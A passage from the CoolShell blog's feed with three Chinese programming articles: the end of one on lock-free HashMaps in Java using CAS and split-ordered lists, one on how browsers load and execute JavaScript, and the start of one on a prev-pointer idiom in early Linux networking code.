<li class="ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-5" href="#%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8B%E6%A0%87%E6%93%8D%E4%BD%9C" title="初始化下标操作">初始化下标操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C" title="插入操作">插入操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-7" href="#%E6%9F%A5%E6%89%BE%E6%93%8D%E4%BD%9C" title="查找操作">查找操作</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-5"><a class="ez-toc-link ez-toc-heading-8" href="#%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C" title="删除操作">删除操作</a></li>
</ul>
</li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-9" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE" title="参考文献">参考文献</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="Java%E4%B8%AD%E7%9A%84%E5%8E%9F%E5%AD%90%E6%93%8D%E4%BD%9C"></span>Java中的原子操作<span class="ez-toc-section-end"></span>
</h4>
<p>在java.util.concurrent.atomic包中，Java为我们提供了很多方便的原子类型，它们底层完全基于CAS操作。</p>
<p>例如我们希望实现一个全局公用的计数器，那么可以：</p>
<p> </p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">private AtomicInteger counter = new AtomicInteger(3);

public void addCounter() {
    for (;;) {
        int oldValue = counter.get();
        int newValue = oldValue + 1;
        if (counter.compareAndSet(oldValue, newValue))
            return;
    }
}</pre>
<p><span id="more-9703"></span></p>
<p>其中，compareAndSet方法会检查counter现有的值是否为oldValue，如果是，则将其设置为新值newValue，操作成功并返回true；否则操作失败并返回false。</p>
<p>当计算counter新值时，若其他线程将counter的值改变，compareAndSwap就会失败。此时我们只需在外面加一层循环，不断尝试这个过程，那么最终一定会成功将counter值+1。（其实AtomicInteger已经为常用的+1/-1操作定义了incrementAndGet与decrementAndGet方法，以后我们只需简单调用它即可）</p>
<p>除了AtomicInteger外，java.util.concurrent.atomic包还提供了AtomicReference和AtomicReferenceArray类型，它们分别代表原子性的引用和原子性的引用数组（引用的数组）。</p>
<h4>
<span class="ez-toc-section" id="%E6%97%A0%E9%94%81%E9%93%BE%E8%A1%A8%E7%9A%84%E5%AE%9E%E7%8E%B0"></span>无锁链表的实现<span class="ez-toc-section-end"></span>
</h4>
<p>在实现无锁HashMap之前，让我们先来看一下比较简单的无锁链表的实现方法。</p>
<p>以插入操作为例：</p>
<ol>
<li><span style="line-height: 13px;">首先我们需要找到待插入位置前面的节点A和后面的节点B。</span></li>
<li><span style="line-height: 13px;">然后新建一个节点C，并使其next指针指向节点B。（见图1）</span></li>
<li>最后使节点A的next指针指向节点C。（见图2）</li>
</ol>
<p><img alt="image placeholder" ></p>
<p>但在操作中途，有可能其他线程在A与B直接也插入了一些节点（假设为D），如果我们不做任何判断，可能造成其他线程插入节点的丢失。（见图3）我们可以利用CAS操作，在为节点A的next指针赋值时，判断其是否仍然指向B，如果节点A的next指针发生了变化则重试整个插入操作。大致代码如下：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">private void listInsert(Node head, Node c) {
    for (;;) {
        Node a = findInsertionPlace(head), b = a.next.get();
        c.next.set(b);
        if (a.next.compareAndSwap(b,c))
            return;
    }
}</pre>
<p>(Node类的next字段为AtomicReference&lt;Node&gt;类型，即指向Node类型的原子性引用)</p>
<p>无锁链表的查找操作与普通链表没有区别。而其删除操作，则需要找到待删除节点前方的节点A和后方的节点B，利用CAS操作验证并更新节点A的next指针，使其指向节点B。</p>
<h4>
<span class="ez-toc-section" id="%E6%97%A0%E9%94%81HashMap%E7%9A%84%E9%9A%BE%E7%82%B9%E4%B8%8E%E7%AA%81%E7%A0%B4"></span>无锁HashMap的难点与突破<span class="ez-toc-section-end"></span>
</h4>
<p>HashMap主要有<strong>插入</strong>、<strong>删除</strong>、<strong>查找</strong>以及<strong>ReHash</strong>四种基本操作。一个典型的HashMap实现，会用到一个数组，数组的每项元素为一个节点的链表。对于此链表，我们可以利用上文提到的操作方法，执行插入、删除以及查找操作，但对于ReHash操作则比较困难。</p>
<p><img alt="image placeholder" ></p>
<p>如图4，在ReHash过程中，一个典型的操作是遍历旧表中的每个节点，计算其在新表中的位置，然后将其移动至新表中。期间我们需要操纵3次指针：</p>
<ol>
<li>将A的next指针指向D</li>
<li>将B的next指针指向C</li>
<li>将C的next指针指向E</li>
</ol>
<p>而这三次指针操作必须同时完成，才能保证移动操作的原子性。但我们不难看出，CAS操作每次只能保证<strong>一个</strong>变量的值被原子性地验证并更新，无法满足同时验证并更新三个指针的需求。</p>
<p>于是我们不妨换一个思路，既然移动节点的操作如此困难，我们可以使所有节点始终保持有序状态，从而避免了移动操作。在典型的HashMap实现中，数组的长度始终保持为2<sup>i</sup>，而从Hash值映射为数组下标的过程，只是简单地对数组长度执行取模运算（即仅保留Hash二进制的后i位）。当ReHash时，数组长度加倍变为2<sup>i+1</sup>，旧数组第j项链表中的每个节点，要么移动到新数组中第j项，要么移动到新数组中第j+2<sup>i</sup>项，而它们的唯一区别在于Hash值第i+1位的不同（第i+1位为0则仍为第j项，否则为第j+2<sup>i</sup>项）。</p>
<p style="text-align: center;"><img alt="image placeholder" ></p>
<p>如图5，我们将所有节点按照Hash值的翻转位序（如1101-&gt;1011）由小到大排列。当数组大小为8时，2、18在一个组内；3、11、27在另一个组内。每组的开始，插入一个哨兵节点，以方便后续操作。为了使哨兵节点正确排在组的最前方，我们将正常节点Hash的最高位（翻转后变为最低位）置为1，而哨兵节点不设置这一位。</p>
<p>当数组扩容至16时（见图6），第二组分裂为一个只含3的组和一个含有11、27的组，但节点之间的相对顺序并未改变。这样在ReHash时，我们就不需要移动节点了。</p>
<h4>
<span class="ez-toc-section" id="%E5%AE%9E%E7%8E%B0%E7%BB%86%E8%8A%82"></span>实现细节<span class="ez-toc-section-end"></span>
</h4>
<p>由于扩容时数组的复制会占用大量的时间，这里我们采用了将整个数组分块，懒惰建立的方法。这样，当访问到某下标时，仅需判断此下标所在块是否已建立完毕（如果没有则建立）。</p>
<p>另外定义size为当前已使用的下标范围，其初始值为2，数组扩容时仅需将size加倍即可；定义count代表目前HashMap中包含的总节点个数（不算哨兵节点）。</p>
<p>初始时，数组中除第0项外，所有项都为null。第0项指向一个仅有一个哨兵节点的链表，代表整条链的起点。初始时全貌见图7，其中浅绿色代表当前未使用的下标范围，虚线箭头代表逻辑上存在，但实际未建立的块。</p>
<p><img alt="image placeholder" ></p>
<h5>
<span class="ez-toc-section" id="%E5%88%9D%E5%A7%8B%E5%8C%96%E4%B8%8B%E6%A0%87%E6%93%8D%E4%BD%9C"></span>初始化下标操作<span class="ez-toc-section-end"></span>
</h5>
<p>数组中为null的项都认为处于未初始化状态，初始化某个下标即代表建立其对应的哨兵节点。初始化是递归进行的，即若其父下标未初始化，则先初始化其父下标。（一个下标的父下标是其移除最高二进制位后得到的下标）大致代码如下：</p>
<p></p>
<pre data-enlighter-language="java" class="EnlighterJSRAW">private void initializeBucket(int bucketIdx) {
    int parentIdx = bucketIdx ^ Integer.highestOneBit(bucketIdx);
    if (getBucket(parentIdx) == null)
        initializeBucket(parentIdx);

    Node dummy = new Node();
    dummy.hash = Integer.reverse(bucketIdx);
    dummy.next = new AtomicReference&amp;lt;&amp;gt;();

    setBucket(bucketIdx, listInsert(getBucket(parentIdx), dummy));
}</pre>
<p>其中getBucket即封装过的获取数组某下标内容的方法，setBucket同理。listInsert将从指定位置开始查找适合插入的位置插入给定的节点，若链表中已存在hash相同的节点则返回那个已存在的节点；否则返回新插入的节点。</p>
<h5>
<span class="ez-toc-section" id="%E6%8F%92%E5%85%A5%E6%93%8D%E4%BD%9C"></span>插入操作<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>首先用HashMap的size对键的hashCode取模，得到应插入的数组下标。</li>
<li>然后判断该下标处是否为null，如果为null则初始化此下标。</li>
<li>构造一个新的节点，并插入到适当位置，注意节点中的hash值应为原hashCode经过位翻转并将最低位置1之后的值。</li>
<li>将节点个数计数器加1，若加1后节点过多，则仅需将size改为size*2，代表对数组扩容（ReHash）。</li>
</ul>
<h5>
<span class="ez-toc-section" id="%E6%9F%A5%E6%89%BE%E6%93%8D%E4%BD%9C"></span>查找操作<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li>找出待查找节点在数组中的下标。</li>
<li>判断该下标处是否为null，如果为null则返回查找失败。</li>
<li>从相应位置进入链表，顺次寻找，直至找出待查找节点或超出本组节点范围。</li>
</ul>
<h5>
<span class="ez-toc-section" id="%E5%88%A0%E9%99%A4%E6%93%8D%E4%BD%9C"></span>删除操作<span class="ez-toc-section-end"></span>
</h5>
<ul>
<li><span style="line-height: 13px;">找出应删除节点在数组中的下标。</span></li>
<li>判断该下标处是否为null，如果为null则初始化此下标。</li>
<li>找到待删除节点，并从链表中删除。（注意由于哨兵节点的存在，任何正常元素只被其唯一的前驱节点所引用，不存在被前驱节点与数组中指针同时引用的情况，从而不会出现需要同时修改多个指针的情况）</li>
<li>将节点个数计数器减1。</li>
</ul>
<h4>
<span class="ez-toc-section" id="%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"></span>参考文献<span class="ez-toc-section-end"></span>
</h4>
<p><a title="《Split-Ordered Lists: Lock-Free Extensible Hash Tables》" href="http://www.cs.ucf.edu/~dcm/Teaching/COT4810-Spring2011/Literature/SplitOrderedLists.pdf" target="_blank">《Split-Ordered Lists: Lock-Free Extensible Hash Tables》</a></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-05-30T21:31:20+08:00</pubDate>
<guid>https://coolshell.cn/articles/9703.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Javascript 装载和执行 ]]></title>
<link>https://coolshell.cn/articles/9749.html</link>
<content><![CDATA[ 
<p><img alt="image placeholder" >一两个月前在淘宝内网里看到一个优化Javascript代码的竞赛，发现有不少的人对Javascript的执行和装载的基础并不懂，所以，从那天起我就想写一篇文章，但一直耽搁了。自上篇《<a title="浏览器的渲染原理简介" href="https://coolshell.cn/articles/9666.html" target="_blank">浏览器渲染原理简介</a>》，正好也可以承前启后。</p>
<p>首先，我想说一下Javascript的装载和执行。通常来说，浏览器对于Javascript的运行有两大特性：<strong>1）载入后马上执行，2）执行时会阻塞页面后续的内容（包括页面的渲染、其它资源的下载）</strong>。于是，如果有多个js文件被引入，那么对于浏览器来说，这些js文件被被串行地载入，并依次执行。</p>
<p>因为javascript可能会来操作HTML文档的DOM树，所以，浏览器一般都不会像并行下载css文件并行下载js文件，因为这是js文件的特殊性造成的。所以，如果你的javascript想操作后面的DOM元素，基本上来说，浏览器都会报错说对象找不到。因为Javascript执行时，后面的HTML被阻塞住了，DOM树时还没有后面的DOM结点。所以程序也就报错了。</p>
<div id="ez-toc-container" class="ez-toc-v2_0_17 counter-hierarchy counter-decimal ez-toc-grey">
<div class="ez-toc-title-container">
<p class="ez-toc-title">目录</p>
<span class="ez-toc-title-toggle"></span>
</div>
<nav><ul class="ez-toc-list ez-toc-list-level-1">
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-1" href="#%E4%BC%A0%E7%BB%9F%E7%9A%84%E6%96%B9%E5%BC%8F" title="传统的方式">传统的方式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-2" href="#documentwrite%E6%96%B9%E5%BC%8F" title="document.write方式">document.write方式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-3" href="#script%E7%9A%84defer%E5%92%8Casync%E5%B1%9E%E6%80%A7" title="script的defer和async属性">script的defer和async属性</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-4" href="#%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BADOM%E6%96%B9%E5%BC%8F" title="动态创建DOM方式">动态创建DOM方式</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-5" href="#%E6%8C%89%E9%9C%80%E5%BC%82%E6%AD%A5%E8%BD%BD%E5%85%A5js" title="按需异步载入js">按需异步载入js</a></li>
<li class="ez-toc-page-1 ez-toc-heading-level-4"><a class="ez-toc-link ez-toc-heading-6" href="#%E6%9B%B4%E5%A4%9A" title="更多">更多</a></li>
</ul></nav>
</div>
<h4>
<span class="ez-toc-section" id="%E4%BC%A0%E7%BB%9F%E7%9A%84%E6%96%B9%E5%BC%8F"></span>传统的方式<span class="ez-toc-section-end"></span>
</h4>
<p>所以，当你写在代码中写下如下的代码：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;script type="text/javascript"
        src="https://coolshell.cn/asyncjs/alert.js"&gt;&lt;/script&gt;</pre>
<p><span id="more-9749"></span></p>
<p>基本上来说，head里的 &lt;script&gt;标签会阻塞后续资源的载入以及整个页面的生成。我专门做了一个示例你可以看看：<strong><a href="https://coolshell.cn/asyncjs/async_test01.html" target="_blank">示例一</a></strong>。 注意：我的alert.js中只有一句话：alert(“hello world”) ，这更容易让你看到javascript是怎么阻塞后面的东西的。</p>
<p>所以，你知道为什么有很多网站把javascript放在网页的最后面了，要么就是动用了window.onload或是docmuemt ready之类的事件。</p>
<p>另外，因为绝大多数的Javascript代码并不需要等页面，所以，我们异步载入的功能。那么我们怎么异步载入呢？</p>
<h4>
<span class="ez-toc-section" id="documentwrite%E6%96%B9%E5%BC%8F"></span>document.write方式<span class="ez-toc-section-end"></span>
</h4>
<p>于是，你可能以为document.write()这种方式能够解决不阻塞的方式。你当然会觉得，document.write了的&lt;script&gt;标签后就可以执行后面的东西去了，这没错。对于在同一个script标签里的Javascript的代码来说，是这样的，但是对于整个页面来说，这个还是会阻塞。 下面是一段测试代码：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;script type="text/javascript" language="javascript"&gt;
    function loadjs(script_filename) {
        document.write('&lt;' + 'script language="javascript" type="text/javascript"');
        document.write(' src="' + script_filename + '"&gt;');
        document.write('&lt;'+'/script'+'&gt;');
        alert("loadjs() exit...");
    }

    var script = 'https://coolshell.cn/asyncjs/alert.js';

    loadjs(script);
    alert("loadjs() finished!");
&lt;/script&gt;

&lt;script type="text/javascript" language="javascript"&gt;
   alert("another block");
&lt;/script&gt;</pre>
<p>你觉得alert的顺序是什么？你可以在不同的浏览器里试一试。这里的想关的测试页面：<strong><a href="https://coolshell.cn/asyncjs/async_test02.html" target="_blank">示例二</a></strong>。</p>
<h4>
<span class="ez-toc-section" id="script%E7%9A%84defer%E5%92%8Casync%E5%B1%9E%E6%80%A7"></span>script的defer和async属性<span class="ez-toc-section-end"></span>
</h4>
<p>IE自从IE6就支持defer标签，如：</p>
<p></p>
<pre data-enlighter-language="html" class="EnlighterJSRAW">&lt;script defer type="text/javascript" src="./alert.js" &gt;
&lt;/script&gt;</pre>
<p>对于IE来说，这个标签会让IE并行下载js文件，并且把其执行hold到了整个DOM装载完毕（DOMContentLoaded），多个defer的&lt;script&gt;在执行时也会按照其出现的顺序来运行。最重要的是&lt;script&gt;被加上defer后，其不会阻塞后续DOM的的渲染。但是因为这个defer只是IE专用，所以一般用得比较少。</p>
<p>而我们标准的的HTML5也加入了一个异步载入javascript的属性：async，无论你对它赋什么样的值，只要它出现，它就开始异步加载js文件。但是， async的异步加载会有一个比较严重的问题，那就是它忠实地践行着“载入后马上执行”这条军规，所以，虽然它并不阻塞页面的渲染，但是你也无法控制他执行的次序和时机。你可以<a href="https://coolshell.cn/asyncjs/async_test01.async.html" target="_blank">看看这个示例去感受一下</a>。</p>
<p>支持 async标签的浏览器是：Firefox3.6+，Chrome 8.0+，Safari 5.0+，IE 10+，Opera还不支持（<a href="https://caniuse.com/#feat=script-async" target="_blank">来自这里</a>）所以这个方法也不是太好。因为并不是所有的浏览器你都能行。</p>
<h4>
<span class="ez-toc-section" id="%E5%8A%A8%E6%80%81%E5%88%9B%E5%BB%BADOM%E6%96%B9%E5%BC%8F"></span>动态创建DOM方式<span class="ez-toc-section-end"></span>
</h4>
<p>这种方式可能是用得最多的了。</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">function loadjs(script_filename) {
    var script = document.createElement('script');
    script.setAttribute('type', 'text/javascript');
    script.setAttribute('src', script_filename);
    script.setAttribute('id', 'coolshell_script_id');

    script_id = document.getElementById('coolshell_script_id');
    if(script_id){
        document.getElementsByTagName('head')[0].removeChild(script_id);
    }
    document.getElementsByTagName('head')[0].appendChild(script);
}

var script = 'https://coolshell.cn/asyncjs/alert.js';
loadjs(script);
</pre>
<p>这个方式几乎成了标准的异步载入js文件的方式，这个方式的演示请参看：<strong><a href="https://coolshell.cn/asyncjs/async_test03.html" target="_blank">示例三</a></strong>。这方式还被玩出了JSONP的东东，也就是我可以为script的src指定某个后台的脚本（如PHP），而这个PHP返回一个javascript函数，其参数是一个json的字符串，返回来调用我们的预先定义好的javascript的函数。你可以看一下这个示例：<a href="https://coolshell.cn/t.js" target="_blank">t.js</a> （这个示例是我之前在微博征集的<a href="https://coolshell.cn/t.html" target="_blank">一个异步ajax调用的小例子</a>）<strong><br>
</strong></p>
<h4>
<span class="ez-toc-section" id="%E6%8C%89%E9%9C%80%E5%BC%82%E6%AD%A5%E8%BD%BD%E5%85%A5js"></span>按需异步载入js<span class="ez-toc-section-end"></span>
</h4>
<p>上面那个DOM方式的例子解决了异步载入Javascript的问题，但是没有解决我们想让他按我们指定的时机运行的问题。所以，我们只需要把上面那个DOM方式绑到某个事件上来就可以了。</p>
<p>比如：</p>
<p><strong>绑在window.load事件上</strong>——<strong><a href="https://coolshell.cn/asyncjs/async_test04.html" target="_blank">示例四</a> </strong></p>
<p><strong></strong>你一定要比较一下示例四和示例三在执行上有什么不同，我在这两个示例中都专门用了个代码高亮的javascript，看看那个代码高亮的的脚本的执行和我的alert.js的执行的情况，你就知道不同了）</p>
<p><code data-enlighter-language="js" class="EnlighterJSRAW">window.load = loadjs("https://coolshell.cn/asyncjs/alert.js")</code></p>
<p><strong>绑在特定的事件上</strong>——<strong><a href="https://coolshell.cn/asyncjs/async_test05.html" target="_blank">示例五</a></strong></p>
<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;p style="cursor: pointer" onclick="LoadJS()"&gt;Click to load alert.js &lt;/p&gt;</code></p>
<p>这个示例很简单了。当你点击某个DOM元素，才会真正载入我们的alert.js。</p>
<h4>
<span class="ez-toc-section" id="%E6%9B%B4%E5%A4%9A"></span>更多<span class="ez-toc-section-end"></span>
</h4>
<p>但是，绑定在某个特定事件上这个事似乎又过了一点，因为只有在点击的时候才会去真正的下载js，这又会太慢了了。好了，到这里，要抛出我们的终极问题——<strong>我们想要异步地把js文件下载到用户的本地，但是不执行，仅当在我们想要执行的时候去执行</strong>。</p>
<p>要是我们有下面这样的方式就好了：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var script = document.createElement("script");
script.noexecute = true;
script.src = "alert.js";
document.body.appendChild(script);

//后面我们可以这么干
script.execute();</pre>
<p>可惜的是，这只是一个美丽的梦想，今天我们的Javascript还比较原始，这个“JS梦”还没有实现呢。</p>
<p>所以，我们的程序员只能使用hack的方式来搞。</p>
<p>有的程序员使用了非标准的script的type来cache javascript。如：</p>
<p><code data-enlighter-language="html" class="EnlighterJSRAW">&lt;script type=cache/script src="./alert.js"&gt;&lt;/script&gt;</code></p>
<p>因为”cache/script”，这个东西根本就不能被浏览器解析，所以浏览器也就不能把alert.js当javascript去执行，但是他又要去下载js文件，所以就可以搞定了。可惜的是，webkit严格符从了HTML的标准——对于这种不认识的东西，直接删除，什么也不干。于是，我们的梦又破了。</p>
<p>所以，我们需要再hack一下，就像N多年前玩preload图片那样，我们可以动用object标签（也可以动用iframe标签），于是我们有下面这样的代码：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">    function cachejs(script_filename){
        var cache = document.createElement('object');
        cache.data = script_filename;
        cache.id = "coolshell_script_cache_id";
        cache.width = 0;
        cache.height = 0;
        document.body.appendChild(cache);
    }</pre>
<p>然后，我们在的最后调用一下这个函数。请参看一下相关的示例：<strong><a href="https://coolshell.cn/asyncjs/async_test06.html" target="_blank">示例六</a></strong></p>
<p>在Chrome下按 Ctrl+Shit+I，切换到network页，你就可以看到下载了alert.js但是没有执行，然后我们再用示例五的方式，因为浏览器端有缓存了，不会再从服务器上下载alert.js了。所以，就能保证执行速度了。</p>
<p>关于这种preload这种东西你应该不会陌生了。你还可以使用Ajax的方式，如：</p>
<p></p>
<pre data-enlighter-language="js" class="EnlighterJSRAW">var xhr = new XMLHttpRequest();
xhr.open('GET', 'new.js');
xhr.send('');</pre>
<p>到这里我就不再多说了，也不给示例了，大家可以自己试试去。</p>
<p>最后再提两个js，一个是<a href="http://stevesouders.com/controljs/" target="_blank">ControlJS</a>，一个叫<a href="http://headjs.com/" target="_blank">HeadJS</a>，专门用来做异步load javascript文件的。</p>
<p>好了，这是所有的内容了，希望大家看过后能对Javascript的载入和执行，以及相关的技术有个了解。<strong>同时，也希望各前端高手不吝赐教！</strong></p>
<p>（全文完）</p>
<div style="margin-top: 15px; font-size: 11px;">
<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 – CoolShell</a> ，请勿用于任何商业用途）</strong></p>
</div>
 ]]></content>
<pubDate>2013-06-05T08:31:06+08:00</pubDate>
<guid>https://coolshell.cn/articles/9749.html</guid>
<author><![CDATA[ 陈皓 ]]></author>
</item>
<item>
<title><![CDATA[ Alan Cox：单向链表中prev指针的妙用 ]]></title>
<link>https://coolshell.cn/articles/9859.html</link>
<content><![CDATA[ 
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">&lt;img class="size-medium wp-image-9906" title="Alan Cox" alt="Alan Cox" src="https://coolshell.cn/wp-content/uploads/2013/06/Alan-Cox-200x300.jpg" width="200" height="300" /&gt; Alan Cox[/caption]

&lt;span style="color: #cc0000;"&gt;&lt;strong&gt; （感谢网友 &lt;/strong&gt;&lt;/span&gt;&lt;a href="http://weibo.com/fullofbull" target="_blank"&gt;&lt;strong&gt;@我的上铺叫路遥&lt;/strong&gt;&lt;/a&gt;&lt;span style="color: #cc0000;"&gt;&lt;strong&gt; 投稿）&lt;/strong&gt;&lt;/span&gt;

之前发过一篇&lt;a href="https://coolshell.cn/articles/8990.html" target="_blank"&gt;二级指针操作单向链表&lt;/a&gt;的例子，显示了C语言指针的灵活性，这次再探讨一个指针操作链表的例子，而且是一种完全不同的用法。

这个例子是linux-1.2.13网络协议栈里的，关于链表遍历&amp;数据拷贝的一处实现。源文件是/net/inet/dev.c，你可以从&lt;a href="https://www.kernel.org/pub/linux/kernel/v1.2/" target="_blank"&gt;kernel.org&lt;/a&gt;官网上下载。

从最早的0.96c版本开始，linux网络部分一直采取TCP/IP协议族实现，这是最为广泛应用的网络协议，整个架构就是经典的OSI七层模型的描述，其中dev.c是属于链路层实现。从功能上看，其位于网络设备驱动程序和网络层协议实现模块之间，作为二者之间的数据包传输通道，一种接口模块而存在——对驱动层的接口函数netif_rx, 以及对网络层的接口函数net_bh。前者提供给驱动模块的中断例程调用，用于链路数据帧的封装；后者作为驱动中断例程&lt;strong&gt;底半部(buttom half)&lt;/strong&gt;，用于对数据帧的解析处理并向上层传送。

为了便于理解，这里补充一下网络通信原理和linux驱动中断机制的背景知识。从最底层的物理层说起，当主机和路由器相互之间进行通信的时候，在物理介质上（同轴、光纤等）以电平信号进行传输。主机或路由器的&lt;strong&gt;硬件接口（网卡）&lt;/strong&gt;负责收发这些信号，当信号发送到接口，再由内置的&lt;strong&gt;调制解调器(modem)&lt;/strong&gt;将数字信号转换成二进制码，这样才能驻留在主机的硬件缓存中。这时接口（网卡）设备驱动程序将通过&lt;strong&gt;硬中断&lt;/strong&gt;来获取硬件缓存中的数据，驱动程序是操作系统中负责直接同硬件设备打交道的模块，硬中断的触发是初始化时通过设置控制寄存器实现的，用于通知驱动程序硬件缓存中有新的数据到来。linux卡设备驱动就是在&lt;strong&gt;中断处理例程(ISR)&lt;/strong&gt;中将硬件缓存数据拷贝到内核缓存中，打包成数据链路帧进行解析处理，再向上分发到各种协议层。由于ISR上下文是原子性的、中断屏蔽的，整个步骤又较为繁琐，因此全部放在ISR中处理会影响到其它中断响应实时性，于是linux有实现一种bottom half的&lt;strong&gt;软中断&lt;/strong&gt;处理机制，将整个ISR一分为二，前半部上下文屏蔽所有中断，专门处理紧急的、实时性强的事务，如拷贝硬件缓存并打包封装，后半部上下文没有屏蔽中断（但代码不可重入），用于处理比较耗时且非紧急事务，包括数据帧的解析处理和分发。下面要讲的net_bh就属于后半部。

我们主要关心的是将链路帧分发到协议层那一段逻辑，下面摘自net_bh函数中的一段代码：

&lt;span id="more-9859"&gt;&lt;/span&gt;

[c]526 void net_bh(void *tmp)
527 {
       ...
577
578    /*
579    * We got a packet ID.  Now loop over the "known protocols"
580    * table (which is actually a linked list, but this will
581    * change soon if I get my way- FvK), and forward the packet
582    * to anyone who wants it.
583    *
584    * [FvK didn't get his way but he is right this ought to be
585    * hashed so we typically get a single hit. The speed cost
586    * here is minimal but no doubt adds up at the 4,000+ pkts/second
587    * rate we can hit flat out]
588    */
589   pt_prev = NULL;
590   for (ptype = ptype_base; ptype != NULL; ptype = ptype-&gt;next)
591   {
592    if ((ptype-&gt;type == type || ptype-&gt;type == htons(ETH_P_ALL)) &amp;&amp; (!ptype-&gt;dev || ptype-&gt;dev==skb-&gt;dev))
593    {
594      /*
595      * We already have a match queued. Deliver
596      * to it and then remember the new match
597      */
598      if(pt_prev)
599      {
600        struct sk_buff *skb2;
601        skb2=skb_clone(skb, GFP_ATOMIC);
602        /*
603        * Kick the protocol handler. This should be fast
604        * and efficient code.
605        */
606        if(skb2)
607          pt_prev-&gt;func(skb2, skb-&gt;dev, pt_prev);
608      }
609      /* Remember the current last to do */
610      pt_prev=ptype;
611    }
612   } /* End of protocol list loop */
613   /*
614   * Is there a last item to send to ?
615   */
616   if(pt_prev)
617     pt_prev-&gt;func(skb, skb-&gt;dev, pt_prev);
618   /*
619    *  Has an unknown packet has been received ?
620    */
621   else
622     kfree_skb(skb, FREE_WRITE);
623
      ...
640 }</pre>
<p>在此稍稍解说一下数据结构，skb就是内核缓存中sock数据封装，协议栈里从链路层到传输层都会用到，只不过封装格式不同，主要是对<strong>协议首部(header)</strong>的由下而上层层剥离（反之由上而下是层层创建），在此你只需理解为一个链路数据帧即可。这段代码的逻辑是解析skb中的协议字段，从协议类型链表（由ptype_base维护）中查询对应的协议节点进行函数指针func回调，以便将数据帧分发到相应的协议层（如ARP、IP、8022、8023等）。</p>
<p>第一眼看上去是不是有点奇怪？这段代码竟然用一个pt_prev指针去维护ptype链表中前一个节点，从而产生了额外的条件分支判断，咋一看是否多了很多“余”了？回顾一下那篇<a href="https://coolshell.cn/articles/8990.html" target="_blank">二级指针操作单向链表</a>的博文，简直完全是反其道而行之的。如果把pt_prev去掉，代码可以精简为：</p>
<p></p>
<pre data-enlighter-language="c" class="EnlighterJSRAW">  for (ptype = ptype_base; ptype != NULL; ptype = ptype-&gt;next)
  {
    if ((ptype-&gt;type == type || ptype-&gt;type == htons(ETH_P_ALL)) &amp;&amp; (!ptype-&gt;dev || ptype-&gt;dev==skb-&gt;dev))
    {
        /*
        * We already have a match queued. Deliver
        * to it and then remember the new match
        */
        struct sk_buff *skb2;
        skb2=skb_clone(skb, GFP_ATOMIC);
        /*
        * Kick the protocol handler. This should be fast
        * and efficient code.
        */
        if(skb2)
            pt_prev-&gt;func(skb2, skb-&gt;dev, pt_prev);
    }
} /* End of protocol list loop */

kfree_skb(skb, FREE_WRITE);</pre>
<p>咋看一下“干净”了很多，不是吗？但我们要记住一点，凡是网上发布的linux内核源代码，都是都是经过众多黑客高手们重重检视并验证过的，人家这么写肯定有十分充足的理由，所以不要太过于相信自己的直觉了，让我们再好好review一下代码吧！看看这段循环里做了什么事情？特别是第592~611行。</p>
<p>由于从网络上拷贝过来skb是唯一的，而分发的协议对象可能是多个，所以在回调之前要做一次clone动作（注意这里是深度拷贝，相当于一次kmalloc）。分发之后还需要调用kfree_skb释放掉原始skb数据块，它的历史使命到此完成了，没有保留的必要（第622行）。<strong>注意，这两个动作都是存在内核开销的。</strong></p>
